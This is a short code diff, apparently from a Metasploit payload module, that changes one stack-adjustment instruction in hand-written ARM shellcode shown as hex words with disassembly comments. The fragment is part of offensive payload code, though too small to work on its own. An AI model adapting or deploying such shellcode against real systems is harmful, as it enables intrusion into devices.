@@ -49,7 +49,7 @@ module MetasploitModule
       0xe59f7048,         #  ldr     r7, [pc, #72]   ; 0x100d4
       0xef000000,         #  svc     0x00000000
       0xe3cdd00f,         #  bic     sp, sp, #15
-      0xe28ddf41,         #  add     sp, sp, #260    ; 0x104
+      0xe28dd028,         #  add     sp, sp, #40     ; 0x28
       0xe3a0406d,         #  mov     r4, #109        ; 0x6d
       0xe52d4004,         #  push    {r4}            ; (str r4, [sp, #-4]!)
       0xe3a04002,         #  mov     r4, #2
